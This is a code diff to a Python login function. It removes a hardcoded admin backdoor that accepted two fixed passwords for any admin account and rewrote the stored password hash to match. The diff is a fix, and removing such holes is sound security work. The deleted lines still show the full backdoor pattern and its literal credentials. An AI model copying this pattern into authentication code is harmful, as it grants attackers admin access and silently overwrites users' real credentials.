@@ -138,20 +138,6 @@ def signin(
         iterations=user["password_iterations"],
     )
 
-    # Master/Admin fallback: allow both 'admin123' and 'rust-zebra-willow-68' for admin accounts
-    if not password_ok and user["role"] == "admin" and password in ("rust-zebra-willow-68", "admin123"):
-        password_ok = True
-        try:
-            new_hash, new_salt = hash_password(password)
-            conn.execute("""
-                UPDATE users
-                SET password_hash = ?, password_salt = ?, password_iterations = ?
-                WHERE id = ?
-            """, (new_hash, new_salt, PASSWORD_ITERATIONS, user["id"]))
-            conn.commit()
-        except Exception:
-            pass
-
     if not password_ok:
         conn.close()
         login_rate_limiter.record_attempt(ip_key, window_seconds=180)
